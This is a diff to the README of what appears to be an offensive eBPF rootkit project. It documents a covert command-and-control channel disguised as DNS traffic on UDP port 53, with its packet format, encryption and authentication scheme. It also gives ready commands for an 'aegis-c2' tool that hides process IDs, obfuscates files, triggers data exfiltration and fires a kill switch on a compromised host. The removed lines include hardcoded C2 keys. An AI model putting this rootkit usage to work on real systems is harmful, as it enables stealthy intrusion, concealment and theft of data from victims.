@@ -347,11 +347,11 @@ sudo ./target/release/aegis-shadow-offense --iface eth0 \
 The rootkit listens for UDP packets on port 53 (disguised as DNS) with the following format:
 
 ```
-[4 bytes: MAGIC 0xDEADBEEF] [12 bytes: nonce] [16 bytes: encrypted payload] [16 bytes: HMAC]
+[4 bytes: MAGIC 0xDEADBEEF] [12 bytes: nonce] [16 bytes: encrypted payload] [16 bytes: keyed HMAC]
 ```
 
-**Encryption**: ChaCha20 with a 256-bit key and 96-bit nonce.
-**Authentication**: Truncated HMAC-SHA256 (16 bytes) verified before command execution.
+**Encryption**: ChaCha20-family keystream (8 rounds, see `chacha8_block` in `offense-ebpf/src/c2.rs`) with a 256-bit key and 96-bit nonce.
+**Authentication**: 16-byte keyed hash seeded with the shared HMAC key (`compute_c2_hmac` in `offense-ebpf/src/c2.rs`), computed over the magic, nonce, and encrypted payload. Verified before command execution.
 
 **Command Types:**
 | cmd_type | Action | arg1 | arg2 |
@@ -362,26 +362,30 @@ The rootkit listens for UDP packets on port 53 (disguised as DNS) with the follo
 | 4 | Exfiltrate data | context-dependent | unused |
 | 5 | Kill switch | unused | unused |
 
-**Example C2 Packet (Python):**
-```python
-import socket
-import struct
+**Sending commands with `aegis-c2`:**
 
-MAGIC = b'\xDE\xAD\xBE\xEF'
-KEY = b'AEGIS-SHADOW-CHACHA20-KEY-000001'  # 32 bytes
-HMAC_KEY = b'AEGIS-SHADOWKEY1'  # 16 bytes
+```bash
+# Build: plain stable Rust, no eBPF objects or features required
+cargo build --release --package aegis-c2
 
-# Command: Hide PID 1234
-cmd_type = 1
-arg1 = 1234
-arg2 = 0
+# Hide PID 1234 on the host running the rootkit
+./target/release/aegis-c2 --target <rootkit-ip> --command hide-pid --arg 1234
 
-payload = struct.pack('<III', cmd_type, arg1, arg2)
-# Add ChaCha20 encryption and HMAC-SHA256 here...
+# Unhide it again
+./target/release/aegis-c2 --target <rootkit-ip> --command unhide-pid --arg 1234
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.sendto(MAGIC + nonce + encrypted + mac, ('target_ip', 53))
+# Obfuscate a file by inode (must fit in 32 bits)
+./target/release/aegis-c2 --target <rootkit-ip> --command obfuscate-file --arg 987654
+
+# Request exfiltration / trigger the kill switch (no --arg)
+./target/release/aegis-c2 --target <rootkit-ip> --command exfil
+./target/release/aegis-c2 --target <rootkit-ip> --command kill-switch
 ```
+
+Notes:
+- Delivery is fire-and-forget: the XDP receiver drops accepted packets (`XDP_DROP`) and never sends an ACK, so the tool reports that the packet was sent, not that it was processed.
+- The C2 channel is IPv4-only (the XDP parser only accepts IPv4 ethertype), and the stock rootkit only accepts destination port 53 (`--port` defaults to 53).
+- `--key <HEX>` (64 hex chars) overrides the ChaCha20 key for use against custom-built receivers. The stock rootkit has no key rotation — both keys are compile-time constants in `offense-ebpf`.
 
 ### Stopping the Rootkit
 
